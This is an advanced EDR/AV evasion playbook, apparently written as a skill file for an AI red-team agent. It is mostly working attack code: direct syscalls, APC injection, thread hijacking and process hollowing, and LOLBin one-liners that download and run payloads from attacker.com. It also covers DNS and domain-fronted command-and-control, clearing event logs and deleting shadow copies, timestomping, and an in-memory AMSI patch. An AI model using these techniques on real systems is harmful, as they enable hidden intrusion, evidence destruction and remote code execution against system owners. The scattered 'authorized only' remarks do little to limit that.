# /evasion-advanced — Advanced EDR/AV Evasion & Operational Security

> **Skill type:** Red Team Ops (Advanced)  
> **Source:** 0xsteph/pentest-ai-agents `opsec-anonymizer`, Sektor7 malware dev, OffSec CRTO course  
> **Chains into:** `/red-team-ops`, `/post-exploit`, `/lateral-movement`  
> **Chained from:** Initial foothold attempt requiring stealth

---

## Purpose

Bypass modern EDR/AV solutions, maintain operational security, and evade detection throughout the engagement. Covers syscall evasion, memory techniques, traffic blending, and log evasion.

---

## EDR Architecture Understanding

```
Standard API Call:
  Process → Win32 API (kernel32.dll) → NTDLL.dll → syscall → kernel

EDR Hooks:
  Process → Win32 API → [EDR HOOK checks here] → NTDLL.dll → [EDR HOOK] → kernel

Evasion goal: bypass hooks by going direct to syscall or using alternate paths
```

---

## Technique 1: Direct Syscalls (Bypass NTDLL Hooks)

```c
// Instead of: VirtualAllocEx → NtAllocateVirtualMemory → syscall
// Use: direct syscall instruction

// SysWhispers3 — generates direct syscall stubs
// https://github.com/klezVirus/SysWhispers3

// Generate syscall stubs for specific APIs
python3 SysWhispers3.py --preset common -o syscalls

// In your C code:
#include "syscalls.h"

PVOID buffer = NULL;
SIZE_T size = 4096;
NtAllocateVirtualMemory(
    GetCurrentProcess(), 
    &buffer, 
    0, 
    &size, 
    MEM_COMMIT | MEM_RESERVE, 
    PAGE_EXECUTE_READWRITE
);  // This goes DIRECTLY to syscall, bypasses NTDLL hooks
```

---

## Technique 2: Sleep Masking (Memory Encryption During Sleep)

```c
// Problem: EDR scans memory periodically — shellcode visible during beacon sleep
// Solution: Encrypt shellcode in memory during sleep intervals

// Ekko sleep masking technique:
// 1. Create timer queue with callbacks
// 2. Timer 1: XOR-encrypt shellcode in memory + flip to non-executable
// 3. Sleep (memory now looks benign)
// 4. Timer 2: XOR-decrypt + flip back to executable
// 5. Resume execution

// Key: During the "sleep" window, no IOCs exist in memory
```

---

## Technique 3: Process Injection Variants

```c
// Classic (detected): VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
// Detectable because: CreateRemoteThread is heavily monitored

// Better: APC (Asynchronous Procedure Call) injection
// Inject into an alertable thread's APC queue
HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
QueueUserAPC((PAPCFUNC)shellcode_addr, hThread, NULL);
// APC fires when thread enters alertable wait state

// Even better: Thread Hijacking
CONTEXT ctx;
SuspendThread(hThread);
GetThreadContext(hThread, &ctx);
ctx.Rip = (DWORD64)shellcode_addr;  // Redirect RIP to shellcode
SetThreadContext(hThread, &ctx);
ResumeThread(hThread);

// No new thread creation = less detection surface

// Process Hollowing
// 1. Create process in SUSPENDED state
CreateProcess("svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, ...);
// 2. Unmap original executable
NtUnmapViewOfSection(pi.hProcess, pBaseAddr);
// 3. Allocate and write malicious code
VirtualAllocEx(pi.hProcess, pBaseAddr, ...);
WriteProcessMemory(pi.hProcess, pBaseAddr, malware, ...);
// 4. Update entry point and resume
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

---

## Technique 4: LOLBins (Living Off the Land)

```powershell
# Execute code using trusted Windows binaries (no files dropped)

# regsvr32 — HTTPS payload delivery
regsvr32 /s /u /i:https://attacker.com/payload.sct scrobj.dll

# certutil — download and execute
certutil.exe -urlcache -f http://attacker.com/payload.exe payload.exe
certutil.exe -decode base64payload.txt payload.exe

# mshta — JavaScript execution
mshta.exe javascript:a=(GetObject("script:https://attacker.com/payload.sct")).Exec();close();

# wmic — process execution
wmic process call create "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('https://attacker.com/ps.ps1')"

# rundll32 — DLL execution
rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";...

# msbuild — XML-embedded C# execution (LOLBin)
# payload.xml contains C# shellcode runner in inline task
msbuild.exe payload.xml

# InstallUtil — AppDomain bypass
# Compile shellcode runner as .NET assembly
# InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# PowerShell (constrained language mode bypass)
# Use P/Invoke in .NET assembly loaded via Add-Type
# Or: use older PowerShell version 2 (no ScriptBlock logging)
powershell -version 2 -c "IEX(New-Object Net.WebClient).DownloadString('...')"
```

---

## Technique 5: Traffic Blending (C2 Stealth)

```bash
# Make C2 traffic look like legitimate HTTPS traffic

# Domain fronting (if available)
# Route C2 traffic through a CDN (Cloudflare, Fastly, Azure CDN)
# HTTP Host header: target-domain.com
# SNI: cdn-provider.com
# Traffic appears to come from cdn-provider.com, not your C2 server

# Protocol tunneling
# C2 over DNS (slow but very stealthy)
# dnscat2: encrypted C2 over DNS TXT records
dnscat2-server --dns=domain=c2.attacker.com --secret=SHARED_SECRET
# On target: dnscat2 --dns=domain.c2.attacker.com --secret=SHARED_SECRET

# C2 over HTTPS with legitimate certificate
# Use Let's Encrypt cert + categorized domain (registered 30+ days)
# Malleable C2 profile to mimic Google Analytics, Microsoft Update, etc.

# Proxy-aware C2
# Use CONNECT method through corporate proxy
# Sliver/Cobalt Strike: set proxy settings in implant
```

---

## Technique 6: Timestamp & Log Manipulation

```bash
# Timestomping (modify file timestamps to blend in)
# Meterpreter
timestomp evil.exe -m "01/01/2021 12:00:00"
timestomp evil.exe -c "01/01/2021 12:00:00"
timestomp evil.exe -a "01/01/2021 12:00:00"

# Linux
touch -t 202101010000 evil_file
touch --reference=/bin/ls evil_file  # Copy timestamps from legitimate file

# Windows event log clearing (authorized only)
# Meterpreter
clearev  # Clears System, Security, Application logs

# PowerShell
Clear-EventLog -LogName Security
wevtutil cl Security
wevtutil cl System

# Anti-forensics: Disable VSS shadow copies
vssadmin delete shadows /all /quiet  # (only if authorized for ransomware simulation)

# Prefetch disabling (hides execution evidence)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f
```

---

## Technique 7: AMSI & ETW Bypass

```powershell
# AMSI (AntiMalware Scan Interface) bypass — in-memory patch
# Method: Patch amsiContext to return 0 (AMSI_RESULT_CLEAN)

# ETW (Event Tracing for Windows) patching
# ETW records .NET assembly loads, PowerShell execution, etc.

# Combined bypass (base64 obfuscated, customize per engagement)
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32

$AMSI = [Win32]::LoadLibrary("amsi.dll")
$addr = [Win32]::GetProcAddress($AMSI, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($addr, [uint32]5, 0x40, [ref]$p)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax,0x80070057; ret
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
```

---

## Detection Avoidance Checklist

```
Before every action:
□ Is this tool/technique commonly signatured? → Use custom variant
□ Will this generate network traffic? → Does it blend with normal traffic?
□ Will this write to disk? → Can it run in-memory instead?
□ Will this create new processes? → Can we inject into existing?
□ Will this modify registry/files? → Will cleanup be complete?
□ Are event logs recording this? → ETW/log suppression needed?
□ Is this timing suspicious? → Does it match normal business hours?
□ Does our user-agent match real browser? → Fix User-Agent header
□ Is our hostname realistic? → Rename implant process

After every action:
□ Remove dropped files
□ Restore modified permissions/configs
□ Clear relevant event log entries (if authorized)
□ Remove scheduled tasks/services created
□ Remove persistence mechanisms when test complete
```
